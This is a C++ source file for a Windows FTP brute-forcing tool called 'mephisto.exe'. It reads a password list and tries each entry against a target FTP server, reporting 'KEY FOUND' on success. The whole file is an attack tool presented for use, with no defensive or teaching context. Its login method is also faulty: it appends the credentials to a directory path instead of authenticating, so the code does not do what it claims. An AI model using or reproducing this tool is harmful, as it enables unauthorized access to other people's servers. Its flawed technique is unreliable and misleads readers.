#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <wininet.h>
#include <sstream>

#pragma comment(lib, "wininet.lib")

void usage() {
    std::cout << "Usage: mephisto.exe -l <username> -P <password list> <ftp://<target ip>>" << std::endl;
}

bool tryFtpLogin(const std::string& username, const std::string& password, const std::string& ftpUrl) {
    HINTERNET hInternet = InternetOpen("FTPBruteForcer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "Failed to initialize internet session." << std::endl;
        return false;
    }

    HINTERNET hFtpSession = InternetOpenUrlA(hInternet, ftpUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFtpSession) {
        std::cerr << "Failed to connect to FTP server." << std::endl;
        InternetCloseHandle(hInternet);
        return false;
    }

    std::stringstream loginUrl;
    loginUrl << ftpUrl << "/" << username << ":" << password;

    // Attempt to login with credentials
    BOOL isLoggedIn = FtpSetCurrentDirectoryA(hFtpSession, loginUrl.str().c_str());
    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);

    return isLoggedIn != 0;
}

int main(int argc, char* argv[]) {
    if (argc < 5) {
        usage();
        return 1;
    }

    std::string username;
    std::string passwordListFile;
    std::string ftpUrl;

    // Parse command-line arguments
    for (int i = 1; i < argc; i++) {
        if (std::string(argv[i]) == "-l" && i + 1 < argc) {
            username = argv[++i];
        } else if (std::string(argv[i]) == "-P" && i + 1 < argc) {
            passwordListFile = argv[++i];
        } else {
            ftpUrl = argv[i];
        }
    }

    if (username.empty() || passwordListFile.empty() || ftpUrl.empty()) {
        usage();
        return 1;
    }

    // Open the password list file
    std::ifstream passwordFile(passwordListFile);
    if (!passwordFile.is_open()) {
        std::cerr << "Could not open password list file: " << passwordListFile << std::endl;
        return 1;
    }

    std::string password;
    while (std::getline(passwordFile, password)) {
        if (tryFtpLogin(username, password, ftpUrl)) {
            std::cout << "KEY FOUND: " << password << std::endl;
            passwordFile.close();
            return 0;
        }
    }

    std::cout << "KEY NOT FOUND" << std::endl;
    passwordFile.close();
    return 0;
}
